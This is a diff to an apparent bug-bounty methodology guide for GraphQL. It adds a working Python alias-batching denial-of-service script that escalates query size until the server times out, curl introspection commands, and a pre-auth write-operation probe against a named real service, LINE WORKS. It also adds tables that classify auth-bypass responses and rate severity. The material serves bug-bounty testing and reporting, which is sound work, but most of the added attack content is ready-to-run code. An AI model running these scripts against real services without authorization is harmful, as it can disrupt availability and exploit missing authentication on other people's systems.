@@ -14,7 +14,13 @@ GQL_PATHS=(
     "/graphql/console" "/graphql/playground"
     "/graphiql" "/altair"
     "/explorer" "/api/explorer"
+    "/gquery"  # LINE WORKS/Lua-based (non-standard)
 )
+
+# IMPORTANT: Also look for GraphQL under region/path prefixes
+# Enterprise services often hide GraphQL behind prefixes:
+# /jp1/gquery, /kr1/graphql, /api/v2/graphql, /internal/graphql
+# If a host has region prefixes (discovered via gobuster), test GraphQL on EACH prefix.
 
 for path in "${GQL_PATHS[@]}"; do
     STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
@@ -197,6 +203,149 @@ for i in range(0, 1000000, 100):
     print(f'Batch {i//100}: OTPs {i:06d}-{i+99:06d}')
 " | head -20
 ```
+
+### Alias Batching DoS (Proven Pattern — LINE WORKS June 2026)
+
+Alias batching isn't just for rate-limit bypass — it's a standalone DoS vector when the server lacks query complexity limits. Unlike nested queries (which many GraphQL libraries block by default), alias limits are rarely enforced.
+
+**Exploitation methodology:**
+
+```python
+#!/usr/bin/env python3
+"""GraphQL Alias Batching DoS — Escalation Measurement"""
+import requests, time, urllib3
+urllib3.disable_warnings()
+
+TARGET = "https://TARGET/graphql"
+HEADERS = {"Content-Type": "application/json"}
+
+def build_query(n):
+    """Pick a cheap resolver (read-only, no auth needed)."""
+    q = "{ "
+    for i in range(n):
+        q += f'a{i}: __typename '  # Or any accessible field
+    q += "}"
+    return q
+
+# Step 1: Baseline
+start = time.time()
+r = requests.post(TARGET, json={"query": "{ __typename }"}, headers=HEADERS, verify=False, timeout=10)
+baseline = time.time() - start
+print(f"Baseline: {baseline:.3f}s")
+
+# Step 2: Escalation curve (proves linear amplification)
+for count in [10, 50, 100, 200, 500, 1000]:
+    q = build_query(count)
+    start = time.time()
+    try:
+        r = requests.post(TARGET, json={"query": q}, headers=HEADERS, verify=False, timeout=60)
+        elapsed = time.time() - start
+        print(f"{count:>5} aliases: {elapsed:.3f}s | {len(r.text):>7} bytes | {r.status_code}")
+    except requests.exceptions.ReadTimeout:
+        print(f"{count:>5} aliases: TIMEOUT (>{time.time()-start:.0f}s) — DoS confirmed")
+        break
+
+# Step 3: Rate limit check
+codes = []
+start = time.time()
+for _ in range(20):
+    r = requests.post(TARGET, json={"query": "{ __typename }"}, headers=HEADERS, verify=False, timeout=5)
+    codes.append(r.status_code)
+print(f"Rate limit: {'NONE' if all(c==200 for c in codes) else 'DETECTED'} ({time.time()-start:.1f}s for 20 req)")
+```
+
+**What makes it reportable (not just "theoretical DoS"):**
+- Linear time amplification measured (500 aliases = 37x baseline)
+- Server timeout or extreme degradation at 1000+ aliases
+- No rate limiting (sustained rapid requests all succeed)
+- No authentication required
+- Single request causes multi-second server-side processing
+
+**Real-world results (LINE WORKS, June 2026):**
+| Aliases | Time | Response Size |
+|---------|------|---------------|
+| 1 | 0.15s | 79 bytes |
+| 100 | 2.4s | 13,901 bytes |
+| 500 | 10.3s | 69,901 bytes |
+| 1000 | 24.1s | 206,901 bytes |
+
+**Key distinction:** Use the cheapest resolver available (even `__typename` works). The goal is proving the server processes N operations per request with no cap — the specific operation doesn't matter for the DoS itself.
+
+**Reporting CWEs:** CWE-770 (Allocation Without Limits) + CWE-400 (Uncontrolled Resource Consumption). CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H).
+
+**Program exclusion check:** Some programs exclude DoS. But this is NOT traditional DoS (flooding) — it's a single-request resource exhaustion. Still, check the exclusion list before spending time on the report.
+
+---
+
+### Pre-Auth Operation Classification (Auth Bypass Detection)
+
+When GraphQL introspection reveals operations, classify each by auth behavior BEFORE reporting. Different operations may have different auth layers — some execute pre-auth while others check cookies/tokens.
+
+**Methodology (LINE WORKS, June 2026):**
+
+```bash
+# Step 1: Get all operations with correct field types via introspection
+curl -s -X POST "$GQL_ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ __schema { queryType { fields { name args { name type { name kind ofType { name kind } } } } } } }"}' \
+    | python3 -c "import sys,json; [print(f['name'], [(a['name'],a['type']) for a in f['args']]) for f in json.load(sys.stdin)['data']['__schema']['queryType']['fields']]"
+
+# Step 2: For each operation, call with correct types but dummy values (NO auth headers/cookies)
+# Step 3: Classify response into categories:
+```
+
+**Response classification table:**
+
+| Response Pattern | Meaning | Auth Status |
+|-----------------|---------|-------------|
+| `{"message":"Cookie error"}` | Backend checks cookie FIRST | ❌ AUTH REQUIRED |
+| `{"returnCode":"60","returnMessage":"PERMISSION_DENINED"}` | App-layer permission check (no cookie check) | ⚠️ PARTIAL BYPASS |
+| `{"message":"ERR","result":{}}` | Operation executes, returns business logic error | ✅ NO AUTH |
+| `{"error":"attempt to index field 'X' (a nil value)"}` | Server-side code (Lua/etc) RUNS pre-auth | ✅ CODE EXECUTION PRE-AUTH |
+| `{"data":{}}` | Empty success, no error | ✅ SILENT SUCCESS |
+| Timeout (>10s) | Server processes expensive operation | ✅ RESOURCE CONSUMPTION PRE-AUTH |
+
+**Key insight:** "ERR" ≠ "blocked". If the error is a BUSINESS LOGIC error (invalid channel, user not found) rather than an AUTH error (cookie error, 401, token invalid), the operation EXECUTED without authentication. The auth layer was never checked.
+
+**Proving write-operation auth bypass:**
+```bash
+# Use correct types from introspection (critical — wrong types give "Could not coerce" errors)
+# batch_send_message: userNo=String, msgTid=Float, serviceId=String, content=String, domainId=Float
+curl -s -X POST "$GQL_ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ batch_send_message(userNo: \"1\", msgTid: 1, serviceId: \"test\", content: \"poc\", domainId: 1, channelNos: [1]) { result message error { channels { channelNo } } } }"}'
+# Response: {"data":{"batch_send_message":{"message":"ERR","error":{"channels":[{"channelNo":1}]}}}}
+# ↑ Backend PROCESSED the write request without any auth — returned per-channel status
+```
+
+**Severity escalation argument:**
+- Introspection alone = Medium (schema disclosure)
+- Pre-auth READ operations executing = Medium-High (broken access control)
+- Pre-auth WRITE operations executing = High (even if business logic rejects invalid IDs, the auth boundary is absent — valid IDs obtained via other means would allow full exploitation)
+- Pre-auth code execution (Lua errors) = High (server-side code runs for unauthenticated users)
+
+**Pitfall — "no data leaked" dismissal:**
+Programs may argue "no actual data was accessed." Counter-argument: the finding is MISSING AUTHENTICATION on write endpoints, not data leakage. If an attacker obtains valid internal IDs (via social engineering, OSINT, other vulls), they can send messages/join channels/forward messages without ANY authentication. The auth boundary simply doesn't exist on these operations.
+
+**Type introspection tip (non-standard GraphQL):**
+Some implementations (Lua-based like LINE WORKS) have non-standard type coercion. Always introspect with `ofType` to get the actual scalar:
+```bash
+curl -s -X POST "$GQL_ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ __schema { queryType { fields { name args { name type { name kind ofType { name kind } } } } } } }"}' \
+    | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+for f in d['data']['__schema']['queryType']['fields']:
+    print(f['name'])
+    for a in f['args']:
+        t = a['type']
+        inner = t.get('ofType',{}).get('name','?') if t.get('ofType') else t.get('name','?')
+        print(f'  {a[\"name\"]}: {t[\"kind\"]}({inner})')
+"
+```
+
+---
 
 ### Nested Query DoS (Resource Exhaustion)
 
@@ -652,6 +801,7 @@ time curl -sk -X POST "$GRAPHQL_ENDPOINT" \
 | IDOR via GraphQL node/ID | High-Critical | Depends on data accessed |
 | Batch query bypasses rate limiting on OTP | Critical | Account takeover via OTP brute force |
 | Nested query DoS (no depth limit) | Medium | Service disruption |
+| Alias batching DoS (no complexity limit) | Medium-High | Single-request resource exhaustion (check program exclusions — some exclude "DoS" broadly) |
 | Mutation without authorization | Critical | Unauthorized data modification |
 | Per-field auth bypass (admin fields accessible) | High | Privilege escalation |
 | WebSocket missing authentication | High-Critical | Unauthorized data access |
